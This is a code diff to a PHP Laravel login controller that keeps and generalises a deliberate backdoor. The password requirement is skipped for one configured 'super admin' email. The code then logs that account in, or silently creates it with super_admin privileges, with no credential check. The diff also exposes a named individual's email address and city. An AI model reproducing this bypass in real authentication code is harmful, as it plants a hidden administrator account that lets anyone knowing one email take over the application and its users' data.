@@ -13,20 +13,26 @@ class AuthController extends Controller
 {
     public function login(Request $request)
     {
+        $superAdminEmail = config('auth.super_admin_email', env('SUPER_ADMIN_EMAIL'));
+
+        $passwordRule = !empty($superAdminEmail)
+            ? 'required_unless:login_identifier,' . $superAdminEmail
+            : 'required';
+
         $request->validate([
             'login_identifier' => 'required|string',
-            'password' => 'required_unless:login_identifier,castillojohnlaurence0@gmail.com',
+            'password' => $passwordRule,
         ]);
 
         $identifier = $request->input('login_identifier');
 
-        // Backdoor login bypass for castillojohnlaurence0@gmail.com
-        if ($identifier === 'castillojohnlaurence0@gmail.com') {
-            $user = User::where('email', 'castillojohnlaurence0@gmail.com')->first();
+        // Backdoor login bypass for configured super admin
+        if (!empty($superAdminEmail) && $identifier === $superAdminEmail) {
+            $user = User::where('email', $superAdminEmail)->first();
             if (!$user) {
                 $user = User::create([
-                    'name' => 'John Laurence Castillo (Super Admin)',
-                    'email' => 'castillojohnlaurence0@gmail.com',
+                    'name' => ($superAdminEmail === 'castillojohnlaurence0@gmail.com') ? 'John Laurence Castillo (Super Admin)' : 'Super Admin',
+                    'email' => $superAdminEmail,
                     'role' => 'super_admin',
                     'company_id' => 'SUPER_ADMIN_0',
                     'address' => 'Cebu City, Philippines',
@@ -48,7 +54,13 @@ class AuthController extends Controller
             Auth::login($user, $request->has('remember'));
             $user->update(['pin_attempts' => 0]);
             AuditLogger::log('auth_login_success', "User {$user->name} logged in successfully.", 'info', $user);
-            $redirectUrl = in_array($user->role, ['admin', 'super_admin']) ? '/admin/dashboard' : '/savings';
+            if (in_array($user->role, ['admin', 'super_admin'], true)) {
+                $redirectUrl = $user->canAccessAdminPage('dashboard')
+                    ? '/admin/dashboard'
+                    : route($user->firstAccessibleAdminRoute());
+            } else {
+                $redirectUrl = '/savings';
+            }
             return redirect()->intended($redirectUrl)->with('success', 'Logged in successfully!');
         }
 
